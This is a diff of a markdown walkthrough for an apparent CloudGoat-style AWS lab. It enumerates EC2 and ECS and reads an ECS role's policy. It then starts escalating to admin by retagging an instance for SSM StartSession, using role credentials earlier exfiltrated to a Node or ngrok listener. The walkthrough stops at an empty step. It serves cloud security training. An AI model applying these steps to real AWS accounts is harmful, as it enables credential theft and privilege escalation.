@@ -72,8 +72,8 @@ cd ecs_efs_attack<random generated strings>
 ### EC2 Enumeration
 1. List all ec2 instances - ```aws ec2 describe-instances```. If you have lots of instances, filter by region and running state: ``` aws ec2 describe-instances --region us-east-1 --filters "Name=instance-state-name, Values=running"```
   Found 2 instances. With StartSession SSM tagged with both:
-    * cg-ruse-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion true)
-    * cg-admin-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion false)
+    * cg-ruse-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion true) 
+    * cg-admin-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion false) <Note Instance ID>
 
 ### ECS Enumeration
 1. List clusters - 
@@ -157,9 +157,38 @@ aws ecs update-service --serivce <service ARN> --cluster <cluster ARN> --task-de
 ```
 8. After a few minutes, you should see that the credentials are sent through in the Node terminal or in the ngrok web interface in the following format
 ```
-{"RoleArn":<ROLEARN>, "AccessKeyId": <AccessKeyId> "SecretAccessKey":<SecretAccessKey">}
+{"RoleArn":<ROLEARN>, "AccessKeyId": <AccessKeyId> "SecretAccessKey":"<SecretAccessKey">}
 ```
-  
+### ECS Role Investigation
+1. Investigate the policies associated with the role ARN retrieved from the previous step
+```
+aws iam list-attached-role-policies --role-name <Role ARN>
+aws iam get-policy-version --policy-arn <Policy ARN> --version-id v1
+```
+2. We see that the ecs role has the ability to perform SSM start session as per the policy below - with the condition that StartSession is True.
+```
+{
+    "Action": "ssm:StartSession",
+    "Condition": {
+	"StringEquals": {
+	    "aws:ResourceTag/StartSession": "true"
+	}
+    },
+    "Effect": "Allow",
+    "Resource": "arn:aws:ec2:*:*:instance/*",
+    "Sid": "VisualEditor1"
+}
+```
+So we need to change the tags on admin ec2 to do that using the instance id role then use SSM to start a session.
+
+### EC2 Admin Privilege Escalation
+1. Use the role credentials from the POST request to assume the ecs role. These will add on to the ruse EC2 credentials.
+```
+aws configure --profile ecs
+<Eneter Access Key, Secret Access Key, Region (same as ruse) and output as text>
+```
+2. Assume the role ``` aws sts get-caller-identity```
+3. 
 # Trouble Shooting
 ## Installation
 
